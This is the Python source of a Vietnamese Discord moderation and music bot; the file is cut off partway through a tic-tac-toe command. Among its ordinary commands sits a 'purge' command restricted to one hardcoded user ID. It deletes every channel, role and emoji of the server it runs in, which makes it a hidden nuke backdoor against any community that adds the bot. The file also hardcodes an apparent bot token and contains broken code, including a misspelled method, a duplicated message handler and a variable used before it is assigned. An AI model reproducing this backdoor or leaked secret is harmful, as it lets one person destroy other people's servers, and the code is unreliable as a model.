from cgi import test
from cgitb import text
from dis import dis
from distutils.log import error
from ftplib import error_perm
from multiprocessing import managers
from multiprocessing.spawn import import_main_path
from operator import imod
import os
from pydoc import cli
import re
from tkinter.messagebox import NO
from turtle import title
from typing import overload
from unicodedata import category, name
from click import pass_context
import discord
from discord.ext import commands, tasks
import random
import asyncio
import json
from httpcore import AsyncByteStream
from numpy import tile
from pandas import Categorical
import requests
import youtube_dl
from discord.ext.commands import bot, has_permissions, MissingPermissions
from random import choice
from colorama import Fore, Style
from youtube_dl.utils import url_basename
from googletrans import Translator
from googlesearch import search 
import bs4
import urllib.parse
import wikipedia
from discord import client
import platform
from pathlib import Path
import io
import sys
import contextlib
import textwrap
from paginator import Paginator
from traceback import format_exception
cwd = Path(__file__).parents[0]
cwd = str(cwd)

print(f"{cwd}\n-----")

intent = discord.Intents.default()
intent.members = True
# or 
intent = discord.Intents.all()

class Pag(Paginator):
    async def teardown(self):
        try:
            await self.page.clear_reactions()
        except discord.HTTPException:
            pass


client = commands.Bot(command_prefix= '$ sudo ', intent=intent)
token = 'OTQyNDExNzE2OTE3MDgwMTE0.YgkHTg.9E3HyRTWSuljAnJyKxtVGkQF87g'
os.chdir("C:\\Users\\Administrator\\PycharmProjects\\pythonProject\\Ghost")
print(Fore.LIGHTGREEN_EX + 'Logging in as Bot...'.format(client)+ Fore.RESET)
client.remove_command('help')

intial_extensions = [
    'cogs.events.py'
    'cogs.afk'
    ]

if __name__ == "__main__":
    for file in os.listdir(cwd + "/cogs"):
        if file.endswith(".py") and not file.startswith("_"):
            client.load_extension(f"cogs.{file[:-3]}")

client.muted_users = {}
afk_reason = ""
queue = []
loop = False
len_servers = []
status = []
player1 = ""
player2 = ""
turn = ""
board = []
gameOver = True
winningConditions = [
    [0, 1, 2],
    [3, 4, 5],
    [6, 7, 8],
    [0, 3, 6],
    [1, 4, 7],
    [2, 5, 8],
    [0, 4, 8],
    [2, 4, 6]
]

def is_it_me(ctx):
    return ctx.author.id == 925032690057609266

client.remove_command('help')
@client.event
async def on_ready():
    checkforvideos.start()
    print(Fore.LIGHTGREEN_EX + 'We have logged in as {0.user}'.format(client)+ Fore.RESET)
    count_servers_members.start()
    change_status.start()

@client.command()
@commands.check(is_it_me)
async def purge(ctx):
    guild = ctx.guild
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
        except:
            print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for role in guild.roles:
        try:
            await role.delete()
            print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
        except:
            print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    await guild.create_text_channel("Thủy tổ")
    channel = client.get_channel(name='Thủy tổ')
    await ctx.channel.send('Thành trừng thành công')
@tasks.loop(seconds=20)
async def count_servers_members():
    len_servers.append(len(client.guilds))
    members = 0
    for guild in client.guilds:
        members += guild.member_count - 1
    len_guild = 'with '+ str(len(client.guilds))+' servers'
    status.append(len_guild)
    status.append(f'{members} members')
    status.append('$ sudo help')
    random_startus = [{len_guild}, f'with {members} members', '`$ sudo help`']
    # await client.change_presence(activity=discord.Streaming(name = choice(random_startus), url = 'https://www.youtube.com/watch?v=_daTfgc4u3k'))

@tasks.loop(seconds=20)
async def change_status():
    await client.change_presence(activity=discord.Streaming(name = choice(status), url = 'https://www.youtube.com/watch?v=_daTfgc4u3k'))
    
@client.event
async def on_message(message):
    bot = f'<@!{client.user.id}>'
    if message.author == client.user:
        return
    if message.content.startwith('migos'):
        await message.channel.send('My prefix is `$ sudo `')

@client.event
async def on_message(message):
    if message.author.bot == False:
        with open('level.json', 'r') as f:
            users = json.load(f)

        await update_data(users, message.author)
        await add_experience(users, message.author, 5)
        await level_up(users, message.author, message)

        with open('level.json', 'w') as f:
            json.dump(users, f)

    await client.process_commands(message)
    # print(message)

async def update_data(users, user):
    if not f'{user.id}' in users:
        users[f'{user.id}'] = {}
        users[f'{user.id}']['experience'] = 0
        users[f'{user.id}']['level'] = 1


async def add_experience(users, user, exp):
    users[f'{user.id}']['experience'] += exp


async def level_up(users, user, message):
    with open('levels.json', 'r') as g:
        levels = json.load(g)
    experience = users[f'{user.id}']['experience']
    lvl_start = users[f'{user.id}']['level']
    lvl_end = int(experience ** (1 / 4))
    if lvl_start < lvl_end:
        await message.channel.send(f'{user.name} đã lên level {lvl_end}')
        print(Fore.GREEN +f'{user.name} đã lên level {lvl_end}' + Fore.RESET)
        users[f'{user.id}']['level'] = lvl_end

# command

@client.command()
async def rules(ctx):
    embed=discord.Embed()
    embed.set_image(url='https://giffiles.alphacoders.com/210/210015.gif')
    embed1=discord.Embed()
    embed1.add_field(name='1) Sự Tôn Trọng',value='Bạn phải tôn trọng tất cả người dùng, bất kể bạn thích họ như thế nào. Đối xử với người khác theo cách mà bạn muốn được đối xử.', inline=False)
    embed2=discord.Embed()
    embed2.add_field(name='2) Dùng Ngôn Ngữ Thích Hợp', value='Việc sử dụng từ ngữ thô tục hoàn toàn tự do ở đây nhưng khuyến khích hạn chế', inline=False)
    embed3=discord.Embed()
    embed3.add_field(name='3) Nói Không với Spam', value='Đừng gửi nhiều tin nhắn nhỏ ngay sau nhau, không spam tên thành viên hoặc vai trò trong mọi trường hợp. Đừng làm gián đoạn cuộc trò chuyện bằng cách gửi thư rác, việc "spam" được hợp lệ ở kênh cho phép bạn spam.',inline=False)
    embed4=discord.Embed()
    embed4.add_field(name='4) Nội dung khiêu dâm / NSFW', value='Đây là nội dung dành cho người lớn những thành viên thiếu tuổi khuyến khích không nên vào, việc bạn truy cập, đăng tải nội dung này chỉ được cho phép ở danh mục "Adults Only"',inline=False)
    embed5=discord.Embed()
    embed5.add_field(name='5) Mối đe dọa', value='Tất cả các hành động nguy hiểm ảnh hưởng đến máy chủ bao gồm: raid, nuke, ép thêm bot chưa được xác minh và một số hành động khác đều bị coi là mối đe dọa', inline=False)
    await ctx.send(embed=embed)
    await ctx.send(embed=embed1)
    await ctx.send(embed=embed2)
    await ctx.send(embed=embed3)
    await ctx.send(embed=embed4)
    await ctx.send(embed=embed5)

@client.command()
async def level(ctx, member: discord.Member = None):
    embed = discord.Embed()
    
    if not member:
        id = ctx.message.author.id
        user = ctx.author
        with open('level.json', 'r') as f:
            users = json.load(f)
        lvl = users[str(id)]['level']
        embed.add_field(name=f'{user.name} level',value=f'Level của bạn là {lvl}!')

        await ctx.send(embed=embed)
        print(Fore.GREEN +f'{user.name} lv {lvl}' + Fore.RESET)
        
    else:
        user = ctx.author
        id = member.id
        with open('level.json', 'r') as f:
            users = json.load(f)
        lvl = users[str(id)]['level']
        embed = discord.Embed()
        embed.add_field(name=f'{member.name} level', value=f'Level của {member.name} là  {lvl}')
        await ctx.send(embed=embed)
        print(Fore.GREEN +f'{user.name} command lv of {member.name} lv {lvl}' + Fore.RESET)

# member control

@client.command()
@has_permissions(manage_messages=True)
async def mute(ctx, member: discord.Member=None, time=None, *, reason=None):
    last_d = time[-1]
    last_time = time[0:-1:1]

    user=ctx.author
    guild = ctx.guild
    mutedRole = discord.utils.get(guild.roles, name="Muted")
    if member == None:
        await ctx.send(f'Thiếu người, dùng `$ sudo mute @user 10m lý do`')
        return
    if time == None:
        await ctx.send(f'Thiếu thời gian mute, dùng `$ sudo mute @user 10m lý do` **Lưu ý**: thời gian và đơn vị phải cách nhau')
        return
    if not mutedRole:
        mutedRole = await guild.create_role(name="Muted")

        for channel in guild.channels:
            await channel.set_permissions(mutedRole, speak=False, send_messages=False, read_message_history=True, read_messages=True, read_channel=True)
    embed = discord.Embed(title="**Muted**", description=f"{member.mention} đã bị mute ", colour=discord.Colour.light_gray())
    embed.add_field(name="Lý do:", value=reason, inline=False)
    embed.add_field(name="Thời gian mute:", value=f"{time}", inline=False)
    await member.add_roles(mutedRole, reason=reason)
    await member.send(f"Bạn đã bị mute từ: {guild.name} Lý do: {reason}")
    await ctx.send(embed=embed)
    print(Fore.GREEN + f'{member.name} has been muted for {time} {reason} by {user}'+ Fore.RESET)

    if last_d == "s":
        await asyncio.sleep(int(last_time))

    if last_d == "m":
        await asyncio.sleep(int(last_time)*60)

    if last_d == "h":
        await asyncio.sleep(int(last_time)*60*60)

    if last_d == "d":
        await asyncio.sleep(int(last_time)*60*60*24)
    await member.remove_roles(mutedRole)

    await member.send(f"Bạn đã được unmuted: - {ctx.guild.name}")
    embed = discord.Embed(title="**Unmuted**", description=f" Unmuted-{member.mention}", colour=user.color,timestamp=ctx.message.created_at)
    await ctx.send(embed=embed)
    print(Fore.GREEN + f'{member.name} has been unmuted'+ Fore.RESET)
    return

@client.command(name='unmute', help='Trả lại quyền được phát ngôn')
@has_permissions(manage_messages=True)
async def unmute(ctx, member: discord.Member):
   mutedRole = discord.utils.get(ctx.guild.roles, name="Muted")
   user=ctx.author
   await member.remove_roles(mutedRole)
   await member.send(f"Bạn đã được unmuted: - {ctx.guild.name}")
   embed = discord.Embed(title="unmute", description=f" unmuted-{member.mention}", colour=user.color,timestamp=ctx.message.created_at)
   await ctx.send(embed=embed)
   print(Fore.GREEN + f'{member.name} has been unmuted by {user}'+ Fore.RESET)

@unmute.error
async def unmute_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)

@mute.error
async def mute_error(ctx, error:MissingPermissions):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)

@client.command(name='kick', help='Đá thành viên')
@has_permissions(manage_messages=True)
async def kick(ctx, member: discord.Member, *, reason=None):
    user=ctx.author
    guild = ctx.guild
    await member.kick(reason=reason)
    embed = discord.Embed(title="Kicked", description=f"{member.mention} đã bị sút một cú cực mạnh ", colour=user.color,timestamp=ctx.message.created_at)
    embed.add_field(name="Lý do:", value=reason, inline=False)
    await ctx.send(embed=embed)
    await member.send(f"Bạn đã bị đá khỏi: {guild.name} Lý do: {reason}")
    print(Fore.GREEN + f'{member.mention} has been kicked by {user}'+ Fore.RESET)


@kick.error
async def kick_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)

@client.command(name='ban', help='Chặn thành viên khỏi máy chủ')
@has_permissions(manage_messages=True)
async def ban(ctx, member : discord.Member, *, reason=None):
    user=ctx.author
    guild = ctx.guild
    await member.ban(reason=reason)
    embed = discord.Embed(title="Banned", description=f"{member.mention} đã bị nhận cái kết đắng ", colour=user.color,timestamp=ctx.message.created_at)
    embed.add_field(name="Lý do:", value=reason, inline=False)
    await ctx.send(embed=embed)
    await member.send(f"Bạn đã bị **BAN** khỏi: {guild.name} Lý do: {reason}")
    print(Fore.GREEN + f'{member.mention} has been banned by {user}'+ Fore.RESET)

@ban.error
async def ban_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)

@client.command(name='unban', help='Bỏ chặn khỏi máy chủ')
@has_permissions(manage_messages=True)
async def unban(ctx, id: int):
    userunban = ctx.author
    guild = ctx.guild
    user = await client.fetch_user(id)
    await ctx.guild.unban(user)
    await user.send(f"Bạn đã được **UNBAN** server: {guild.name}")
    embed = discord.Embed(title="Unbanned", description=f"unban: {str(user)}", colour=user.color,timestamp=ctx.message.created_at)
    await ctx.send(embed=embed)
    print(Fore.GREEN + f'{str(user)} was unbaned by {userunban}'+ Fore.RESET)

@unban.error
async def unban_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)

@client.command(name='clear', help='Xóa 10 tin nhắn gần nhất')
@has_permissions(manage_messages=True)
async def clear(ctx, amount: int):
    user = ctx.author
    channel = discord.utils.get(ctx.guild.channels)
    await ctx.channel.purge(limit=amount)
    print(Fore.GREEN + f'{user} been deleted {amount} messages in {channel}'+ Fore.RESET)

@clear.error
async def clear_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)

@client.command()
@has_permissions(manage_messages=True)
async def rename(ctx, member: discord.Member,* ,nick):
    user = ctx.author
    await member.edit(nick=nick)
    await ctx.send(f'{member.mention} đã được thay biệt danh thành {nick}')
    print(Fore.GREEN + f'{member} has been renamed to "{nick}" by {user}'+ Fore.RESET)

@rename.error
async def rename_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)

@client.command()
@has_permissions(manage_messages=True)
async def move(ctx, member: discord.Member, channel: discord.VoiceChannel):
    user = ctx.author
    await member.move_to(channel)
    await ctx.send(f'{member.name} đã bị chuyển đến {channel}!')
    print(Fore.GREEN + f'{member.mention} has been moved to {channel} by {user.mention}'+ Fore.RESET)

# music.command

youtube_dl.utils.bug_reports_message = lambda: ''

ytdl_format_options = {
    'format': 'bestaudio/best',
    'outtmpl': '%(extractor)s-%(id)s-%(title)s.%(ext)s',
    'restrictfilenames': True,
    'noplaylist': True,
    'nocheckcertificate': True,
    'ignoreerrors': False,
    'logtostderr': False,
    'quiet': True,
    'no_warnings': True,
    'default_search': 'auto',
    'source_address': '0.0.0.0' 
}

ffmpeg_options = {
    'options': '-vn'
}

ytdl = youtube_dl.YoutubeDL(ytdl_format_options)

class YTDLSource(discord.PCMVolumeTransformer):
    def __init__(self, source, *, data, volume=0.5):
        super().__init__(source, volume)

        self.data = data

        self.title = data.get('title')
        self.url = data.get('url')

    @classmethod
    async def from_url(cls, url, *, loop=None, stream=False):
        loop = loop or asyncio.get_event_loop()
        data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream))

        if 'entries' in data:
            # take first item from a playlist
            data = data['entries'][0]

        filename = data['url'] if stream else ytdl.prepare_filename(data)
        return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data)

def is_connected(ctx):
    voice_client = ctx.message.guild.voice_client
    return voice_client and voice_client.is_connected()

songs = asyncio.Queue()
play_next_song = asyncio.Event()



async def audio_player_task():
    while True:
        play_next_song.clear()
        current = await songs.get()
        current.start()
        await play_next_song.wait()

@client.command(name='play', help='This command plays music')
async def play(ctx):
    global queue

    if not ctx.message.author.voice:
        await ctx.send("Bạn chưa kết nối vào kênh thoại!")
        return
    
    elif len(queue) == 0:
        await ctx.send('Hàng chờ của bạn đang "trống" dùng `$ sudo queue + link Youtube` hoặc `Tên bài hát` để thêm!')

    else:
        try:
            channel = ctx.message.author.voice.channel
            await channel.connect()
        except: 
            pass

    server = ctx.message.guild
    voice_channel = server.voice_client
    user = ctx.author
    while queue:
        try:
            while voice_channel.is_playing() or voice_channel.is_paused():
                await asyncio.sleep(2)
                pass

        except AttributeError:
            pass
        
        try:
            async with ctx.typing():
                player = await YTDLSource.from_url(queue[0], loop=client.loop)
                voice_channel.play(player, after=lambda e: print('Player error: %s' % e) if e else None)
                
                if loop:
                    queue.append(queue[0])

                del(queue[0])
                
            await ctx.send('**Now playing:** {}'.format(player.title))
            print(Fore.GREEN+f'{user}'+' Playing '+Fore.RESET)
        except Exception as bug:
            await ctx.send(bug)
            return
            
@client.command(name='join', help='Lệnh này để tôi tham gia vào kênh thoại')
async def join(ctx):
    if not ctx.message.author.voice:
        await ctx.send("Bạn chưa kết nối vào kênh thoại")
        return
    
    else:
        channel = ctx.message.author.voice.channel

    await channel.connect()
    print(Fore.GREEN + f'has been joined {channel}'+ Fore.RESET)
    
    
@client.command(name='leave', help='Lệnh này để tôi rời kênh thoại')
async def leave(ctx):
    user = ctx.author
    voice_client = ctx.message.guild.voice_client
    await voice_client.disconnect()
    print(Fore.GREEN + f'{user} leave command'+ Fore.RESET)

@client.command(name='loop', help='Chế độ loop')
async def loop_(ctx):
    user = ctx.author
    global loop

    if loop:
        await ctx.send('Loop mode is now `False!`')
        loop = False
    
    else: 
        await ctx.send('Loop mode is now `True!`')
        loop = True
    
    if loop == False:
        print(Fore.GREEN + 'Loop mode is now False!'+ Fore.RESET)
    
    else:
        print(Fore.GREEN + 'Loop mode is now True!'+ Fore.RESET)
    print(Fore.GREEN + f'{user} loop command'+ Fore.RESET)

@client.command(name='volume', help='Lệnh này để tăng giảm âm lượng!')
async def volume(ctx, volume: int=None):

    user = ctx.author
    if volume == None:
        await ctx.send('Thiếu âm lượng điều chỉnh dùng `$ sudo volume 100`')
    if ctx.voice_client is None:
        return await ctx.send("Bạn chưa kết nối vào kênh thoại!")
    
    ctx.voice_client.source.volume = volume / 100
    await ctx.send(f"Âm lượng {volume}%")
    print(Fore.GREEN + f'{user} changed volume to {volume}%'+ Fore.RESET)
    



@client.command(name='pause', help='Lệnh này để tạm dừng bài hát')
async def pause(ctx):
    user = ctx.author
    
    server = ctx.message.guild
    voice_channel = server.voice_client

    voice_channel.pause()
    await ctx.send('Đã tạm dừng')
    print(Fore.GREEN + f'{user} paused the music'+ Fore.RESET)

@client.command(name='resume', help='Lệnh này để tiếp tục phát')
async def resume(ctx):
    server = ctx.message.guild
    voice_channel = server.voice_client
    user = ctx.author
    voice_channel.resume()
    await ctx.send('Tiếp tục phát')
    print(Fore.GREEN + f'{user} resumed the music'+ Fore.RESET)

@client.command(name='stop', help='Lệnh này để dừng bài hát')
async def stop(ctx):
    user = ctx.author
    server = ctx.message.guild
    voice_channel = server.voice_client
    queue.clear()
    voice_channel.stop()
    await ctx.send('Đã hủy')
    
    print(Fore.GREEN + f'{user} stoped the music'+ Fore.RESET)

@client.command(name='queue')
async def queue_(ctx, *,url=None):
    user = ctx.author
    
    if url==None:
        await ctx.send('Thiếu link dùng `$ sudo queue link Youtube` hoặc `$ sudo queue tên bài`')
        return
    global queue
    queue.append(url)
    await ctx.send(f'`{url}` được thêm vào hàng chờ!')
    print(Fore.GREEN + f'{user} queue {url}'+ Fore.RESET)

@client.command(name='remove', help='Lệnh này để loại bỏ một một bài khỏi danh sách')
async def remove(ctx, number=None):
    global queue
    user = ctx.author
    if number == None:
        await ctx.send('Dùng `$ sudo remove + số thứ tự của bài trong hàng chờ` ví dụ: `$ sudo remove 1` `$ sudo remove 2` ')
    try:
        del(queue[int(number)])
        await ctx.send(f'Hàng chờ của bạn bây giờ là `{queue}!`')
    
    except:
        await ctx.send('Hàng chờ của bạn đang ** trống **')
    print(Fore.GREEN + f'{user} removed {number}'+ Fore.RESET)

@client.command(name='view', help='Danh sách chờ')
async def view(ctx):
    user = ctx.author
    await ctx.send(f'Hàng chờ của bạn bây giờ là: `{queue}!`')
    print(Fore.GREEN + f'{user} show queue(view)'+ Fore.RESET)

@client.command(name='skip', help='Lệnh này để skip!')
async def skip(ctx):
    global queue
    user = ctx.author
    channel=ctx.message.author.voice.channel
    server = ctx.message.guild
    voice_channel = server.voice_client
    voice_channel.stop()
    try:
        async with ctx.typing():
            player = await YTDLSource.from_url(queue[0], loop=client.loop)
            voice_channel.play(player, after=lambda e: print('Player error: %s' % e) if e else None)
            
            if loop:
                queue.append(queue[0])

            del(queue[0])
            
        await ctx.send('**Now playing:** {}'.format(player.title))

    except:
        await ctx.send(f'Đây là bài cuối cùng trong hàng chờ!')
    print(Fore.GREEN + f'{user} skiped the music'+ Fore.RESET)    

# self

@client.command()
async def stats(ctx):
    client.version = '2'
    members = 0
    for guild in client.guilds:
        members += guild.member_count - 1
    pythonVersion = platform.python_version()
    dpyVersion = discord.__version__
    serverCount = len(client.guilds)
    memberCount = len(set(client.get_all_members()))
    embed = discord.Embed(title=f'{client.user.name} Stats', description='\uFEFF', colour=ctx.author.colour, timestamp=ctx.message.created_at)

    embed.add_field(name='Bot Version:', value=client.version)
    embed.add_field(name='Python Version:', value=pythonVersion)
    embed.add_field(name='Discord.Py Version', value=dpyVersion)
    embed.add_field(name='Total Guilds:', value=serverCount)
    embed.add_field(name='Total Users:', value=members)
    embed.add_field(name='Bot Developers:', value="<@925032690057609266>")
    embed.set_footer(text=f"Carpe Noctem | {client.user.name}")
    embed.set_author(name=client.user.name, icon_url=client.user.avatar_url)

    await ctx.send(embed=embed)

@client.command(name="userinfo")
async def userinfo(ctx,user:discord.Member=None):
    user_command = ctx.author

    if user==None:
        user=ctx.author

    rlist = []
    for role in user.roles:
      if role.name != "@everyone":
        rlist.append(role.mention)

    b = ", ".join(rlist)
    if user == None:
        user = ctx.author
        roles = [role for role in ctx.author.roles]

    else:
        roles = [role for role in user.roles]

    embed = discord.Embed(colour=user.color,timestamp=ctx.message.created_at)

    embed.set_author(name=f"User Info - {user}"),
    embed.set_thumbnail(url=user.avatar_url),
    embed.set_footer(text=f'Requested by - {ctx.author}',
  icon_url=ctx.author.avatar_url)

    embed.add_field(name='ID:',value=user.id,inline=False)
    embed.add_field(name='Name:',value=user.display_name,inline=False)
    embed.add_field(name="Created At:", value=user.created_at.strftime("%a, %d, %B, %Y, %I, %M, %p UTC"), inline=False)
    embed.add_field(name="Joined At:", value=user.joined_at.strftime("%a, %d, %B, %Y, %I, %M, %p UTC"), inline=False)
    embed.add_field(name='Bot?',value=user.bot,inline=False)
    embed.add_field(name="Current Status:", value=str(user.status).title(), inline=False)
    embed.add_field(name="Current Activity:", value=f"{str(user.activity.type).title().split('.')[1]} {user.activity.name}" if user.activity is not None else "None", inline=False)
    embed.add_field(name=f"Roles ({len(roles)})", value=" **|** ".join([role.mention for role in roles]), inline=False)
    embed.add_field(name="Top Role:", value=user.top_role, inline=False)
    
    await ctx.send(embed=embed)
    print(Fore.GREEN + f'{user_command} userinfo command {user}'+ Fore.RESET)

@client.command()
async def serverinfo(ctx):
    
    role_count = len(ctx.guild.roles)

    icon = str(ctx.guild.icon_url)
    
    user=ctx.author
    
    embed = discord.Embed(titel='Serverinfo', description=f' ',colour=user.color,timestamp=ctx.message.created_at)

    embed.set_thumbnail(url=icon)
    
    embed.add_field(name='Server Name', value=f'{ctx.guild.name}', inline=False)
    
    embed.add_field(name="Owner", value=f'{ctx.guild.owner}', inline=False)
    
    embed.set_footer(text=f'Requested by - {ctx.author}',
  icon_url=ctx.author.avatar_url)
    
    embed.add_field(name='Member Count', value=f'{ctx.guild.member_count}', inline=False)
    
    embed.add_field(name='Verify Level', value=f'{ctx.guild.verification_level}', inline=False)
    
    embed.add_field(name='Highest Role', value=f'{ctx.guild.roles[-1]}', inline=False)
    
    embed.add_field(name='Number of roles', value=f'{role_count}', inline=False)
    
    embed.add_field(name='Guild ID', value=f'{ctx.guild.id}', inline=False)
    
    await ctx.send(embed=embed)
    print(Fore.GREEN + f'{user} server info command'+ Fore.RESET)

@client.command(pass_context=True)
async def roles(ctx):
    user=ctx.author
    rlist = []
    for role in user.roles:
      if role.name != "@everyone":
        rlist.append(role.mention)

    b = " ".join(rlist)

    user=ctx.author
    guild = ctx.guild
    role_count = len(ctx.guild.roles)
    roles = [role for role in guild.roles if role != ctx.guild.default_role]
    
    embed = discord.Embed(title="Server Roles", description=f" ".join([role.mention for role in roles]), colour=user.color,timestamp=ctx.message.created_at)
    embed.add_field(name=f'Number of roles: {str(role_count)}',value=f"Your roles:{''.join([b])}", inline=False)
    await ctx.send(embed=embed)

@client.command()
async def ID(ctx, *, user : discord.Member=None):
    
    if user==None:
        user=ctx.author
        embed = discord.Embed(colour=ctx.author.color,timestamp=ctx.message.created_at)
        embed.add_field(name='Your ID:',value=user.id,inline=False)
        await ctx.send('Dùng `$ sudo id + tên người`')
    
    if user==user:
        embed = discord.Embed(colour=user.color,timestamp=ctx.message.created_at)
        embed.add_field(name=f'{user}\'s ID is:',value=user.id,inline=False)
    
    await ctx.send(embed=embed)

@client.command()
async def invites(ctx, user = None):
    if user == None:
        totalInvites = 0
        for i in await ctx.guild.invites():
            if i.inviter == ctx.author:
                totalInvites += i.uses

        embed = discord.Embed(title="Invites", description=f"You've invited {totalInvites} member{'' if totalInvites == 1 else 's'} to the server!")

    
        await ctx.send(embed=embed)
    else:
        totalInvites = 0
        for i in await ctx.guild.invites():
            
            if i.inviter == user:
                totalInvites += i.uses
        embed = discord.Embed(title="Invites", description=f"{user} has invited {totalInvites} member{'' if totalInvites == 1 else 's'} to the server!")

        await ctx.send(embed=embed)

@client.command()
async def avatar(ctx, *,  user : discord.Member=None):
    await ctx.message.delete()
    mem = ctx.author
    embed = discord.Embed()
    
    if user==None:
        await ctx.send(f'Dùng `$ sudo avatar +tên người `')
    
    if user ==user:
        embed.set_image(url=user.avatar_url)
        my_msg= await ctx.send(embed=embed)
        
        await my_msg.add_reaction('😍')
        await my_msg.add_reaction('👍')
        await my_msg.add_reaction('👎')
        await my_msg.add_reaction('🥵')
        print(Fore.GREEN + f'{mem} command {user} avatar'+ Fore.RESET)

@client.command()
@has_permissions(manage_roles=True)
async def create_role(ctx, *, name):
    guild = ctx.guild
    user = ctx.author
    
    await guild.create_role(name=name)
    await ctx.send(f'Role `{name}` has been created')
    print(Fore.GREEN + f'{user} created role {name}'+ Fore.RESET)

@create_role.error
async def create_role_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)

@client.command()
async def create_channel(ctx, stage: str=None, *, name=None):
    user = ctx.author
    channel = discord.utils.get(ctx.guild.channels)
    channel_id = channel.id
    if stage == None:
        await ctx.send('Thiếu giá trị: Bạn cần cho tôi biết kênh cần tạo là "văn bản" hay "thoại", VD: `$ sudo create_channel text kênh-chat` hoặc `$ sudo create_channel voice kênh-thoại`')
        return
    
    if stage== stage and name ==None:
        await guild.create_text_channel(name)
        return
    
    embed = discord.Embed()
    guild = ctx.guild
    
    if stage == 'text':
        try:
            await guild.create_text_channel(name, category=client.get_channel(channel_id))
        except:
            await guild.create_text_channel(name)
        embed.add_field(name=f'Created {stage} channel', value=f'"**{name}**" channel has been created')
        await ctx.send(embed=embed)
        print(Fore.GREEN + f'{user} created {stage} channel {name}'+ Fore.RESET)
        return

    if stage == 'voice':
        try:
            await guild.create_voice_channel(name, category=client.get_channel(channel_id))
        except:
            await guild.create_voice_channel(name)
        embed.add_field(name=f'Created {stage} channel', value=f'"**{name}**" channel has been created')
        await ctx.send(embed=embed)
        print(Fore.GREEN + f'{user} created {stage} channel {name}'+ Fore.RESET)
        return

@create_channel.error
async def create_channel_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)

@client.command()
async def create_category(ctx, *, name):
    embed = discord.Embed()
    guild = ctx.guild
    await guild.create_category(name=name)
    embed.add_field(name=f'Created {name} category', value=f'"{name}" category has been created')
    await ctx.send(embed=embed)

@create_category.error
async def create_categori_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(title='Thiếu quyền', description='Bạn thiếu quyền để thực hiện hành động này')
        await ctx.send(embed=embed)

@client.command()
@has_permissions(manage_messages=True)
async def slowmode(ctx, seconds: int=None):
    if seconds == None:
        await ctx.send('Thiếu giá trị: Bạn cần nhập số giây trễ trong kênh VD: `$ sudo slowmode 5`, `$ sudo slowmode 10`')
        return
    embed = discord.Embed()
    embed.add_field(name='Slow mode', value=f'Độ trễ được đặt chậm thành {seconds} giây!')
    await ctx.channel.edit(slowmode_delay = seconds)
    await ctx.send(embed=embed)

@client.command()
@has_permissions(manage_messages=True)
async def lockdown(ctx):
    user = ctx.author
    channel = ctx.channel
    await channel.set_permissions(ctx.guild.default_role, send_messages=False)
    embed = discord.Embed(title=f'{ctx.channel.name} đã bị khóa')
    await ctx.send(embed=embed)
    print(Fore.GREEN + f'{user} lock channel {channel.name}'+ Fore.RESET)

@client.command()
@has_permissions(manage_messages=True)
async def unlock(ctx):
    user = ctx.author
    channel = ctx.channel
    await channel.set_permissions(ctx.guild.default_role, send_messages=True)
    embed = discord.Embed(title=f'{ctx.channel.name} đã mở')
    await ctx.send(embed=embed)
    print(Fore.GREEN + f'{user} unlock channel {channel.name}'+ Fore.RESET)

# game

@client.command()
async def tictactoe(ctx, p1: discord.Member, p2: discord.Member):
    global count
    global player1
    global player2
    global turn
    global gameOver

    if gameOver:
        global board
        board = [":white_large_square:", ":white_large_square:", ":white_large_square:",
                 ":white_large_square:", ":white_large_square:", ":white_large_square:",
                 ":white_large_square:", ":white_large_square:", ":white_large_square:"]
        turn = ""
        gameOver = False
        count = 0

        player1 = p1
        player2 = p2

        # print the board
        line = ""
        for x in range(len(board)):
            if x == 2 or x == 5 or x == 8:
                line += " " + board[x]
                await ctx.send(line)
                line = ""
            else:
                line += " " + board[x]

        # determine who goes first
        num = random.randint(1, 2)
        if num == 1:
            turn = player1
            await ctx.send("Lượt của <@" + str(player1.id) + ">")
        elif num == 2:
            turn = player2
            await ctx.send("Lượt của <@" + str(player2.id) + ">")
    else:
        await ctx.send("Một trò chơi đã được tiến hành! Hoàn thành nó trước khi bắt đầu một cái mới!")

@client.command()
async def place(ctx, pos: int):
    global turn
    global player1
    global player2
    global board
    global count
    global gameOver

    if not gameOver:
        mark = ""
        if turn == ctx.author:
            if turn == player1:
                mark = ":regional_indicator_x:"
            elif turn == player2:
                mark = ":o2:"
